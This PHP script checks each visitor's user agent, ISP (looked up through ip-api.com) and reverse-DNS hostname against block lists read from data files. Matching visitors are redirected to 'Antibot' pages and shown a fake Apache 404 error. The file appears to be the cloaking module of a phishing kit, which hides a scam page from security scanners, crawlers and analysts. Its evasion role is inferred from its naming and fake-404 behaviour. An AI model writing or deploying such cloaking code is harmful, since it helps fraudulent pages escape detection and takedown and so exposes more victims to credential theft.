<?php
$tanitatikaram = parse_ini_file("Anticonfig.ini", true);
$setting_isp = $tanitatikaram['Isp'];
$setting_host = $tanitatikaram['Hostname'];
$setting_ua = $tanitatikaram['Useragent'];
date_default_timezone_set("Asia/Jakarta");
function get_data($data) {
    $data = file_get_contents("Hemsworth/$data.dat");
    if(strcasecmp(substr(PHP_OS, 0, 3), 'WIN') == 0){
    $data = explode("\r\n", $data);
    }else{
    $data = explode("\n", $data);
    }
    return $data;
}
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
$blocker_ua = get_data("useragent");
$blocker_hostname = get_data("hostname");
$blocker_isp = get_data("isp");
$blocker_uafull = get_data("ua-full");
$ip = getenv("REMOTE_ADDR");
$url = "http://ip-api.com/json/" . $ip;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($ch);
curl_close($ch);
$details = json_decode($resp, true);
$isp = $details['isp'];
$asn = $details['as'];
if ($setting_ua == "on") {
    foreach ($blocker_ua as $useragent) {
        if (substr_count($ua, strtolower($useragent)) > 0 or $ua == "" or $ua == " " or $ua == "    ") {
            $status = "botu";
            $detect = "User Agent";
        }
    }
    foreach ($blocker_uafull as $uanew) {
        if ($ua == strtolower($uanew)) {
            $status = "botu";
            $detect = "User Agent";
        }
    }
}
if ($status == "botu") {
    header('Location: Antibot/Useragent.php');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>');
}
if ($setting_isp == "on") {
    foreach ($blocker_isp as $ispbot) {
        if (substr_count($isp, $ispbot) > 0) {
            $status = "botisp";
            $detect = "ISP";
        }
    }
}
if ($status == "botisp") {
	header('Location: Antibot/Isp.php');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>');
}
if ($setting_host == "on") {
    foreach ($blocker_hostname as $hostnamebot) {
        if (substr_count($hostname, $hostnamebot) > 0) {
            $status = "botH";
            $detect = "Hostname";
        }
    }
}
if ($status == "botH") {
	header('Location: Antibot/Hostname.php');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>');
};